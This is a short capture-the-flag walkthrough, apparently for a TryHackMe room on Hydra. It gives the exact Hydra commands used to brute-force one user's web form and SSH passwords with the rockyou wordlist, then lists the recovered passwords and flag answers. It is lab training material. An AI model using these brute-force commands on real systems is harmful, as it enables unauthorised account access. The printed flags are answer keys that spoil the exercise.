```
author: 0xUu
date: Jun 7th, 2024
topic: Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials. 
```

# Task 1. Hydra introduction 

* Read the above and have Hydra at the ready.

```
just install hydra using apt install hydra
```


# Task 2. 

* Use Hydra to bruteforce molly's web password. What is flag 1?
```
THM{2673a7dd116de68e85c48ec0b1f2612e}

I ran: hydra -l molly -P /opt/rockyou.txt $IP http-post-form "/login:username=^USER^&password=^PASS^:F=incorr
ect" -V 

correct credentials were: moly / sunshine
```

* Use Hydra to bruteforce molly's SSH password. What is flag 2?
```
THM{c8eeb0468febbadea859baeb33b2541b}

I ran: hydra -l molly -P /opt/rockyou.txt ssh://$IP 

correct credentials were: moly / butterfly
```

I connected to the server using `ssh molly@$IP`, cat flag2.txt and done.